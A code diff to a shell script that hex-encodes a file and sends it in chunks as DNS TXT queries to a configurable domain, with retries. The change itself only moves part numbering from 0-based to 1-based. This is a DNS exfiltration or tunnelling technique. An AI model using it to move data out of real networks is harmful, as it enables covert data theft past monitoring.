@@ -80,8 +80,8 @@ else
 fi
 sleep 0.1
 
-# Read file and send chunks
-PART_NUM=0
+# Read file and send chunks (1-based part numbering)
+PART_NUM=1
 BYTES_READ=0
 
 while [ $BYTES_READ -lt $FILE_SIZE ]; do
@@ -96,7 +96,7 @@ while [ $BYTES_READ -lt $FILE_SIZE ]; do
     DATA_QUERY="${CHUNK_HEX_LABELS}.${PART_NUM}.${HASH8}.${DOMAIN}"
     
     # Send DNS query
-    echo -n "Sending part $PART_NUM/$((TOTAL_PARTS - 1))... "
+    echo -n "Sending part $PART_NUM/$TOTAL_PARTS... "
     if [ -z "$DNS_SERVER" ]; then
         dig +short "$DATA_QUERY" TXT > /dev/null 2>&1 || true
     else
@@ -145,10 +145,10 @@ while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
     MISSING_COUNT=$(echo "$MISSING_CHUNKS" | wc -l)
     echo "Found $MISSING_COUNT missing chunk(s): $(echo $MISSING_CHUNKS | tr '\n' ' ')"
     
-    # Retry sending missing chunks
+    # Retry sending missing chunks (1-based, so subtract 1 for offset)
     for chunk_num in $MISSING_CHUNKS; do
-        # Calculate byte offset for this chunk
-        chunk_offset=$((chunk_num * CHUNK_SIZE))
+        # Calculate byte offset for this chunk (1-based part number, so subtract 1)
+        chunk_offset=$(((chunk_num - 1) * CHUNK_SIZE))
         
         # Read chunk and encode to hex
         CHUNK_HEX=$(dd if="$FILE" bs=1 skip=$chunk_offset count=$CHUNK_SIZE 2>/dev/null | xxd -p | tr -d '\n')
